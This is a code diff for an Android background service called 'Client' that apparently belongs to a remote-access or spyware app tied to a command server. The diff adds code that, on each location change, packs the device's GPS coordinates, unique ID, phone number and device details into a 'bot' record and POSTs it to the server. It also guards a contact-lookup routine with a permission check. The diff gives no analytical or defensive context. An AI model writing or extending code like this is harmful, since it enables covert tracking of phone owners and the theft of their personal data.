@@ -17,6 +17,7 @@ import android.os.IBinder;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.support.v4.app.ActivityCompat;
+import android.support.v4.content.ContextCompat;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
@@ -27,6 +28,7 @@ import org.json.JSONObject;
 import java.net.URISyntaxException;
 import java.util.HashMap;
 
+import http.Http;
 import io.socket.client.Ack;
 import io.socket.client.IO;
 import io.socket.client.Socket;
@@ -38,6 +40,7 @@ public class Client extends Service {
     private static final String TAG = "Client";
 
     public static final String SERVER = "http://192.168.1.251:3000";
+    private static final String POST_STATUS = "/status";
     private Client client;
     private Socket socket;
     private boolean connected;
@@ -97,15 +100,14 @@ public class Client extends Service {
 
     private final LocationListener locationListener = new LocationListener() {
         public void onLocationChanged(Location location) {
-            updateWithNewLocation(location);
+            updateLocation(location);
         }
 
         public void onProviderDisabled(String provider) {
-            updateWithNewLocation(null);
+            updateLocation(null);
         }
 
-        public void onProviderEnabled(String provider) {
-        }
+        public void onProviderEnabled(String provider) {}
 
         public void onStatusChanged(String provider, int status, Bundle extras) {
         }
@@ -132,6 +134,7 @@ public class Client extends Service {
 
         latitude = 0;
         longitude = 0;
+
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
             LocationManager locManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
             locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 400, 1, locationListener);
@@ -257,31 +260,53 @@ public class Client extends Service {
 
     }
 
-    private void updateWithNewLocation(Location location) {
+    private void updateLocation(Location location) {
         if (location != null) {
             latitude = location.getLatitude();
             longitude = location.getLongitude();
+
+            Log.i(TAG, "Location changed ....");
+
+            HashMap bot = new HashMap();
+            bot.put("uid", uid);
+            bot.put("provider", provider);
+            bot.put("lat", latitude);
+            bot.put("longi", longitude);
+            bot.put("device", device);
+            bot.put("sdk", sdk);
+            bot.put("version", version);
+            bot.put("phone", phone);
+            Http req = new Http();
+            req.setUrl(SERVER + POST_STATUS + "/" + uid);
+            req.setMethod("POST");
+            req.setParams(bot);
+            req.execute();
         }
     }
 
 
     public String getContactName(Context context, String phoneNumber) {
-        ContentResolver cr = context.getContentResolver();
-        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
-        Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
-        if (cursor == null) {
-            return null;
-        }
-        String contactName = null;
-        if (cursor.moveToFirst()) {
-            contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
-        }
+        // check permission
+        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+            ContentResolver cr = context.getContentResolver();
+            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
+            Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
+            if (cursor == null) {
+                return null;
+            }
+            String contactName = null;
+            if (cursor.moveToFirst()) {
+                contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
+            }
 
-        if (cursor != null && !cursor.isClosed()) {
-            cursor.close();
-        }
+            if (cursor != null && !cursor.isClosed()) {
+                cursor.close();
+            }
 
-        return contactName;
+            return contactName;
+        } else {
+            return "";
+        }
     }
 
 }
